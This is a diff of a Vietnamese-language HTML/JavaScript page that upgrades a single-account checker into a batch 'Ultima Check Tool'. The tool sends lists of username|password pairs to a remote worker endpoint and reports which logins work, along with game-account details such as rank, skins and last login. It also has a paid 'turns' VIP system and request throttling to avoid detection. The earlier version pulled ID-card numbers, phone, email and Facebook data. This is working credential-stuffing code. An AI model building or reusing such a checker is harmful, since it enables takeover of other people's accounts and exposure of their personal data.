@@ -3,125 +3,287 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Check Info Pro</title>
+    <title>Ultima Check Tool - Premium</title>
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&family=Roboto+Mono:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Segoe UI', monospace; background: #121212; color: #e0e0e0; padding: 20px; display: flex; justify-content: center; }
-        .container { width: 100%; max-width: 600px; background: #1e1e1e; padding: 20px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
-        h2 { text-align: center; color: #00bcd4; margin-bottom: 20px; }
-        input, textarea, button { width: 100%; padding: 12px; margin-top: 10px; border-radius: 5px; border: 1px solid #333; background: #252526; color: white; box-sizing: border-box; }
-        input:focus, textarea:focus { border-color: #00bcd4; outline: none; }
-        button { font-weight: bold; cursor: pointer; transition: 0.2s; border: none; }
-        #btnCheck { background: #007acc; }
-        #btnCheck:hover { background: #005f9e; }
-        #btnCopy { background: #28a745; display: none; margin-top: 5px; }
-        #result { height: 300px; font-size: 13px; line-height: 1.5; white-space: pre-wrap; }
-        .loading { opacity: 0.7; pointer-events: none; }
+        :root {
+            --bg: #0a0b10;
+            --panel: #13151b;
+            --primary: #00f2ff;
+            --success: #00ff9d;
+            --error: #ff0055;
+            --text: #e0e6ed;
+            --border: #2a2f3d;
+        }
+        * { box-sizing: border-box; outline: none; }
+        body { margin: 0; background: var(--bg); color: var(--text); font-family: 'Rajdhani', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+        
+        /* Header & Stats */
+        header { display: flex; justify-content: space-between; align-items: center; padding: 15px 30px; background: rgba(19, 21, 27, 0.9); border-bottom: 1px solid var(--border); backdrop-filter: blur(10px); }
+        .logo { font-size: 24px; font-weight: 800; color: var(--primary); text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 10px rgba(0, 242, 255, 0.5); }
+        
+        .user-panel { display: flex; gap: 20px; align-items: center; }
+        .stat-box { background: #000; padding: 5px 15px; border-radius: 4px; border: 1px solid var(--border); font-family: 'Roboto Mono', monospace; font-size: 14px; }
+        .stat-box span { color: var(--primary); font-weight: bold; }
+        .stat-box.danger span { color: var(--error); }
+        
+        #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 999; display: flex; justify-content: center; align-items: center; flex-direction: column; }
+        #loginInput { padding: 15px; width: 300px; background: #000; border: 2px solid var(--primary); color: white; font-size: 18px; text-align: center; border-radius: 5px; margin-bottom: 20px; }
+        
+        /* Main Layout */
+        .main-container { display: flex; flex: 1; padding: 20px; gap: 20px; height: calc(100vh - 70px); }
+        
+        /* Left: Input */
+        .input-section { flex: 1; display: flex; flex-direction: column; gap: 15px; max-width: 400px; }
+        .glass-panel { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); display: flex; flex-direction: column; height: 100%; }
+        
+        h3 { margin: 0 0 15px 0; color: var(--text); font-size: 18px; text-transform: uppercase; border-left: 4px solid var(--primary); padding-left: 10px; }
+        
+        textarea { flex: 1; background: #08090c; border: 1px solid var(--border); color: #a0aec0; padding: 15px; resize: none; border-radius: 8px; font-family: 'Roboto Mono', monospace; font-size: 13px; line-height: 1.5; transition: 0.3s; }
+        textarea:focus { border-color: var(--primary); box-shadow: 0 0 15px rgba(0, 242, 255, 0.1); color: white; }
+        
+        .btn-group { display: flex; gap: 10px; margin-top: 15px; }
+        button { flex: 1; padding: 15px; border: none; border-radius: 6px; font-weight: 700; cursor: pointer; text-transform: uppercase; font-family: 'Rajdhani', sans-serif; font-size: 16px; transition: 0.2s; position: relative; overflow: hidden; }
+        
+        .btn-start { background: linear-gradient(135deg, #00b4db 0%, #0083b0 100%); color: white; box-shadow: 0 4px 15px rgba(0, 180, 219, 0.3); }
+        .btn-start:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0, 180, 219, 0.5); }
+        .btn-start:active { transform: translateY(0); }
+        .btn-start:disabled { background: #333; color: #666; cursor: not-allowed; transform: none; box-shadow: none; }
+        
+        /* Right: Output */
+        .output-section { flex: 2; display: flex; flex-direction: column; height: 100%; }
+        .result-list { flex: 1; overflow-y: auto; padding-right: 5px; display: flex; flex-direction: column; gap: 8px; }
+        
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #000; }
+        ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--primary); }
+        
+        /* Result Item Card */
+        .res-item { background: #1a1d26; padding: 12px 15px; border-radius: 6px; border-left: 4px solid #555; font-family: 'Roboto Mono', monospace; font-size: 13px; display: flex; align-items: center; justify-content: space-between; animation: slideIn 0.3s ease; }
+        .res-item.success { border-left-color: var(--success); background: rgba(0, 255, 157, 0.05); }
+        .res-item.error { border-left-color: var(--error); background: rgba(255, 0, 85, 0.05); color: #ff88a0; }
+        
+        .res-text { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 90%; }
+        .copy-btn { background: transparent; border: 1px solid #444; color: #888; padding: 4px 8px; border-radius: 4px; font-size: 10px; cursor: pointer; }
+        .copy-btn:hover { border-color: var(--primary); color: var(--primary); }
+
+        .summary-bar { margin-top: 15px; padding: 15px; background: #13151b; border-radius: 8px; display: flex; justify-content: space-between; border: 1px solid var(--border); font-weight: bold; }
+        .sum-ok { color: var(--success); }
+        .sum-fail { color: var(--error); }
+
+        @keyframes slideIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>TOOL CHECK INFO</h2>
-    <input type="text" id="inputData" placeholder="Nhập tài khoản|mật khẩu (Ví dụ: user|pass)">
-    <button id="btnCheck" onclick="startCheck()">KIỂM TRA NGAY</button>
-    
-    <textarea id="result" placeholder="Kết quả sẽ hiện ở đây..." readonly></textarea>
-    <button id="btnCopy" onclick="copyResult()">COPY KẾT QUẢ</button>
-</div>
+    <div id="loginOverlay">
+        <h2 style="color: var(--primary); margin-bottom: 20px;">XÁC THỰC NGƯỜI DÙNG</h2>
+        <input type="text" id="loginInput" placeholder="Nhập ID User (VD: 7239343492)">
+        <button class="btn-start" style="width: 200px;" onclick="login()">TRUY CẬP</button>
+        <p style="color: #666; font-size: 12px; margin-top: 10px;">Dữ liệu đọc từ database.js</p>
+    </div>
 
-<script>
-    // --- LINK WORKER CỦA BẠN ---
-    const WORKER_URL = 'https://proud-art-e32c.qdev09.workers.dev/'; 
+    <header>
+        <div class="logo">⚡ ULTIMA TOOL</div>
+        <div class="user-panel">
+            <div class="stat-box">ID: <span id="displayId">---</span></div>
+            <div class="stat-box" id="turnBox">LƯỢT: <span id="displayTurns">---</span></div>
+        </div>
+    </header>
 
-    async function startCheck() {
-        const input = document.getElementById('inputData').value.trim();
-        const btn = document.getElementById('btnCheck');
-        const resBox = document.getElementById('result');
-        const btnCopy = document.getElementById('btnCopy');
+    <div class="main-container">
+        <div class="input-section">
+            <div class="glass-panel">
+                <h3>📦 DANH SÁCH TÀI KHOẢN</h3>
+                <textarea id="inputList" placeholder="Nhập danh sách (Mỗi dòng 1 tk|mk)...&#10;user1|pass1&#10;user2|pass2"></textarea>
+                <div class="btn-group">
+                    <button id="btnStop" class="btn-start" style="background: #333; display: none;" onclick="stopCheck()">DỪNG LẠI</button>
+                    <button id="btnCheck" class="btn-start" onclick="startCheck()">BẮT ĐẦU CHECK</button>
+                </div>
+                <div style="margin-top: 10px; font-size: 12px; color: #666; text-align: center;">
+                    Tự động xóa dòng khi check xong
+                </div>
+            </div>
+        </div>
 
-        if (!input.includes('|')) {
-            alert("⚠️ Sai định dạng! Hãy nhập: user|pass");
-            return;
-        }
-
-        const [user, pass] = input.split('|');
-
-        // UI Loading
-        btn.innerText = "Đang kết nối...";
-        btn.classList.add('loading');
-        resBox.value = "⏳ Đang lấy dữ liệu...";
-        btnCopy.style.display = 'none';
-
-        try {
-            const response = await fetch(WORKER_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ account: user.trim(), password: pass.trim() })
-            });
-
-            const json = await response.json();
-
-            if (json.status === 'success') {
-                const d = json.data;
+        <div class="output-section">
+            <div class="glass-panel" style="padding: 0; background: transparent; border: none; box-shadow: none;">
+                <div class="result-list" id="resultContainer">
+                    </div>
                 
-                // --- FORMAT DỮ LIỆU Y HỆT FILE PYTHON ---
-                // Sử dụng toán tử || "" để tránh lỗi null nếu API trả thiếu trường
-                const formattedString = 
-`${d.username}|${d.password}| ` +
-`UID: ${d.uid || "null"} | ` +
-`NAME: ${d.name || "null"} | ` +
-`RANK: ${d.rank || "null"} | ` +
-`LEVEL: ${d.level || "null"} | ` +
-`TƯỚNG: ${d.tuong || "null"} | ` +
-`SKIN: ${d.skin || "null"} | ` +
-`QH: ${d.qh || "null"} | ` +
-`LỊCH SỬ NẠP: ${d.lsnap || "null"} | ` +
-`SÒ: ${d.so || "null"} | ` +
-`CCCD: ${d.cccd || "null"} | ` +
-`EMAIL: ${d.email || "null"} | ` +
-`AUTHEN: ${d.authen || "null"} | ` +
-`SĐT: ${d.sdt || "null"} | ` +
-`FB: ${d.fb || "null"} | ` +
-`BAND: ${d.band || "null"} | ` +
-`NGÀY ĐK: ${d.timeregacc || "null"} | ` +
-`REGION: ${d.acc_country || "null"} | ` +
-`LOGIN GẦN NHẤT: ${d.lslogin || "null"} | ` +
-`ĐỔI MAIL: ${d.change_email || "null"} | ` +
-`ĐỔI SĐT: ${d.change_sdt || "null"} | ` +
-`ĐỔI PASS: ${d.change_password || "null"} | ` +
-`SS: ${d.ss || "null"} | ` +
-`SSS: ${d.sss || "null"} | ` +
-`SKIN HIẾM: ${d.skinlimited || "null"} | ` +
-`MYSTIC: ${d.mystic || "null"} | ` +
-`S-DREAMER: ${d.sdreamer || "null"} | ` +
-`VALENTINE: ${d.valentine || "null"} | ` +
-`OTHER: ${d.other || "null"} | ` +
-`ANIME: ${d.anime || "null"} | ` +
-`AOV: ${d.aov || "null"} | ` +
-`HOẠT ĐỘNG: ${d.tshoatdong || "null"} | ` +
-`TÌNH TRẠNG: ${d.tt || "null"}`;
+                <div class="summary-bar">
+                    <div>THÀNH CÔNG: <span id="countOk" class="sum-ok">0</span></div>
+                    <div>THẤT BẠI: <span id="countFail" class="sum-fail">0</span></div>
+                </div>
+            </div>
+        </div>
+    </div>
 
-                resBox.value = formattedString;
-                btnCopy.style.display = 'block'; // Hiện nút Copy
-            } else {
-                resBox.value = `❌ LỖI: ${json.msg || json.data || "Không xác định"}`;
+    <script src="database.js"></script>
+    <script>
+        // --- CẤU HÌNH ---
+        const WORKER_URL = 'https://proud-art-e32c.qdev09.workers.dev/'; // Thay link worker của bạn
+        
+        let currentUser = null;
+        let isRunning = false;
+        let stopSignal = false;
+        let stats = { ok: 0, fail: 0 };
+
+        // 1. Logic Đăng nhập (Giả lập đọc từ database.js)
+        function login() {
+            const id = document.getElementById('loginInput').value.trim();
+            if (!VIP_DATABASE[id]) {
+                alert("❌ ID không tồn tại hoặc chưa đăng ký!");
+                return;
+            }
+            
+            currentUser = {
+                id: id,
+                data: VIP_DATABASE[id] // Lấy dữ liệu từ file database.js
+            };
+
+            // Kiểm tra hạn sử dụng
+            const expiry = new Date(currentUser.data.expiry);
+            const now = new Date();
+            
+            // Logic ưu tiên: Nếu còn hạn ngày -> Không trừ lượt. Nếu hết hạn -> Trừ lượt.
+            // Nhưng theo yêu cầu của bạn: "Mỗi lần check -1 lượt".
+            // Vậy ta chỉ quan tâm đến turns.
+            
+            if (currentUser.data.turns <= 0) {
+                alert("⚠️ Tài khoản đã hết lượt sử dụng (0 turns).");
+                return;
             }
 
-        } catch (e) {
-            resBox.value = `❌ Lỗi kết nối: ${e.message}`;
+            document.getElementById('displayId').innerText = id;
+            updateTurnDisplay();
+            document.getElementById('loginOverlay').style.display = 'none';
         }
 
-        btn.innerText = "KIỂM TRA NGAY";
-        btn.classList.remove('loading');
-    }
+        function updateTurnDisplay() {
+            const turnSpan = document.getElementById('displayTurns');
+            const box = document.getElementById('turnBox');
+            turnSpan.innerText = currentUser.data.turns;
+            
+            if (currentUser.data.turns < 10) box.classList.add('danger');
+            else box.classList.remove('danger');
+        }
 
-    function copyResult() {
-        const copyText = document.getElementById("result");
-        copyText.select();
-        document.execCommand("copy");
-        alert("Đã copy thành công!");
-    }
-</script>
+        // 2. Logic Check
+        async function startCheck() {
+            const textArea = document.getElementById('inputList');
+            let lines = textArea.value.split('\n').filter(line => line.trim() !== "");
 
+            if (lines.length === 0) {
+                alert("⚠️ Danh sách trống!");
+                return;
+            }
+            
+            if (currentUser.data.turns <= 0) {
+                alert("⛔ HẾT LƯỢT! Vui lòng nạp thêm.");
+                return;
+            }
+
+            // Reset trạng thái
+            isRunning = true;
+            stopSignal = false;
+            document.getElementById('btnCheck').style.display = 'none';
+            document.getElementById('btnStop').style.display = 'block';
+            textArea.disabled = true;
+
+            // Vòng lặp xử lý
+            for (let i = 0; i < lines.length; i++) {
+                if (stopSignal || currentUser.data.turns <= 0) break;
+
+                const line = lines[i];
+                if (!line.includes('|')) {
+                    addResult(line, "Sai định dạng", false);
+                    continue; // Bỏ qua dòng lỗi
+                }
+
+                const [user, pass] = line.split('|');
+                
+                // Gọi API
+                const result = await checkAccount(user.trim(), pass.trim());
+                
+                // Trừ lượt (Dù đúng hay sai)
+                currentUser.data.turns--;
+                updateTurnDisplay();
+
+                // Xử lý kết quả
+                if (result.status === 'success') {
+                    // Format kết quả 1 dòng
+                    const d = result.data;
+                    const oneLine = `${d.username}|${d.password} | Rank: ${d.rank} | Skin: ${d.skin} | Tướng: ${d.tuong} | Login: ${d.lslogin}`;
+                    
+                    addResult(oneLine, null, true);
+                    stats.ok++;
+                    
+                    // Xóa dòng đã check thành công khỏi textarea
+                    // Ta lấy giá trị hiện tại, remove dòng đó
+                    const currentText = textArea.value;
+                    const newText = currentText.replace(line + "\n", "").replace(line, ""); 
+                    textArea.value = newText.trim();
+                } else {
+                    addResult(`${user}|${pass}`, result.msg || "Lỗi check", false);
+                    stats.fail++;
+                    // Giữ lại dòng lỗi (hoặc xóa tùy bạn, code này đang giữ lại dòng lỗi để user biết sai con nào)
+                }
+
+                // Cập nhật thống kê
+                document.getElementById('countOk').innerText = stats.ok;
+                document.getElementById('countFail').innerText = stats.fail;
+
+                // Delay nhẹ để không spam server
+                await new Promise(r => setTimeout(r, 500));
+            }
+
+            stopCheck();
+        }
+
+        async function checkAccount(account, password) {
+            try {
+                const response = await fetch(WORKER_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ account, password })
+                });
+                return await response.json();
+            } catch (e) {
+                return { status: 'error', msg: "Lỗi mạng/API" };
+            }
+        }
+
+        function stopCheck() {
+            isRunning = false;
+            stopSignal = true;
+            document.getElementById('btnCheck').style.display = 'block';
+            document.getElementById('btnStop').style.display = 'none';
+            document.getElementById('inputList').disabled = false;
+            
+            if (currentUser.data.turns <= 0) {
+                alert("⚠️ Đã hết lượt sử dụng. Dừng tool.");
+            }
+        }
+
+        // 3. Hiển thị kết quả
+        function addResult(text, errorMsg, isSuccess) {
+            const container = document.getElementById('resultContainer');
+            const div = document.createElement('div');
+            div.className = `res-item ${isSuccess ? 'success' : 'error'}`;
+            
+            const content = isSuccess ? text : `${text} -> [${errorMsg}]`;
+            
+            div.innerHTML = `
+                <div class="res-text" title="${content}">${content}</div>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText('${content}')">COPY</button>
+            `;
+            
+            // Thêm vào đầu danh sách
+            container.insertBefore(div, container.firstChild);
+        }
+    </script>
 </body>
 </html>
